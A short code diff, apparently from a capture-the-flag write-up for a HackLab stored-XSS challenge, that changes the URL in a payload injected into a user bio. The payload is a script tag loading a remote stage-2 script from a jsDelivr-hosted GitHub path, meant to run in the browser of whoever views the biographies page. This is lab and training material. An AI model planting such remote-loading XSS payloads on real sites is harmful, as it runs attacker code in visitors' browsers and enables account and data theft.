@@ -15,7 +15,7 @@
     const imgBlob = new Blob([bytes], { type: "image/jpeg" });
 
     // Payload stored in the bio: the stage-2 script that will run for whoever loads /biographies (Jeni).
-    const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-43-blog-hacklab-v2/assets/stage2.js"><\/script>';
+    const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-43-blog-hacklab-v2-hacklab-2025/assets/stage2.js"><\/script>';
 
     const fd = new FormData();
     fd.append("bio", bioPayload);
